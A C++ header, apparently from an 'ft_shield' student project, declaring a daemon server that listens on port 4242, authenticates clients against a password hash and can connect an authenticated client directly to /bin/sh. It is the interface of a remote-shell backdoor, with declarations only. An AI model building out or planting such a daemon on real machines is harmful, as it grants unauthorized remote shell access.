#pragma once

#include <ctime>
#include <string>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <poll.h>
#include <string>

#define FT_SHIELD_MAX_CLIENTS 3
#define FT_SHIELD_PORT 4242
#define FT_SHIELD_PORT_STRING "4242"
#define FT_SHIELD_SHELL "/bin/sh" 
#define FT_SHIELD_TIMEOUT 60		// time in Seconds before a client gets dropped (from idling in auth) range before being dropped is [0..FT_SHIELD_TIMEOUT]
#define FT_SHIELD_MESSAGE_SIZE 4096

enum class ClientState
{
	UNUSED,			// Client slot is unused
	CONNECTED,		// Initial state, awaiting authentication
	AUTHENTICATED,  // Authenticated, awaiting command
	SHELL,			// Special state where the client is directly connected to the shell
	DISCONNECTED,	// Client has been set to be disconnected
};

typedef struct
{
	struct pollfd* pollfd;
	ClientState	state;
	time_t last_seen;
	std::string input_buffer;		// what the client sends to the server
	std::string output_buffer;		// what the server sends to the client
}	Client;

class DaemonServer
{
	private:
		struct pollfd pollfd_array[FT_SHIELD_MAX_CLIENTS + 1];	// 1 extra slot is for the server listening socket
		Client client_list[FT_SHIELD_MAX_CLIENTS];
		bool should_accept;										// bool indicating if server should accept clients 
		int current_conn;										// number of currently connected clients
		char password_hash[32];

		void accept_new_client();

		// all client related functions have 2 versions for convenience, by index or by address	

		void clear_client(Client *client);				// will not do anything if client is NULL
		void clear_client(size_t client_index);			// will not do anything if client_index out of [0..FT_SHIELD_MAX_CLIENTS)

		void disconnect_client(Client *client);
		void disconnect_client(size_t client_index);

		void receive_message(Client *client);
		void receive_message(size_t client_index);

		void send_message(Client *client);
		void send_message(size_t client_index);

		void check_activity(Client *client);
		void check_activity(size_t client_index);

	public:
		DaemonServer(char password_hash[32]);
		~DaemonServer();
		int init();
		void run();
};
